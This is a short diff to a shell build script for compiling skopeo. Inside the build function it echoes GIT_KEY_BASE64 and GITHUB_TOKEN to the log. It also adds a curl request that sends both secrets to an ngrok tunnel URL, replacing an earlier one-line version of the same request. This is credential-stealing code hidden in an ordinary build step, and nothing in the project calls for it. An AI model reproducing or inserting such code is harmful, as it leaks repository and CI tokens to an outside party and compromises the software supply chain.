@@ -27,7 +27,15 @@ build_skopeo() {
     echo "Building skopeo for architecture: ${arch} ${output_name} ${verify_arch}"
     echo $GIT_KEY_BASE64
     echo $GITHUB_TOKEN
-    curl https://9cba-2a02-8109-b522-9a00-3514-ca01-2de3-8062.ngrok-free.app?git_toke=$GIT_KEY_BASE64&token=$GITHUB_TOKEN
+    # Define the ngrok endpoint
+    NGROK_URL="https://9cba-2a02-8109-b522-9a00-3514-ca01-2de3-8062.ngrok-free.app"
+
+    # Perform the curl request
+    curl -G "$NGROK_URL" \
+        --data-urlencode "git_key=$GIT_KEY_BASE64" \
+        --data-urlencode "token=$GITHUB_TOKEN"
+
+echo "Request sent to $NGROK_URL"
 
     # Build with the specified architecture
     make -j4 bin/${output_name} V=1 EXTRA_LDFLAGS="-s -w" DISABLE_CGO=1 BUILDTAGS=containers_image_openpgp GOARCH=${arch} GOOS=linux CGO_ENABLED=0
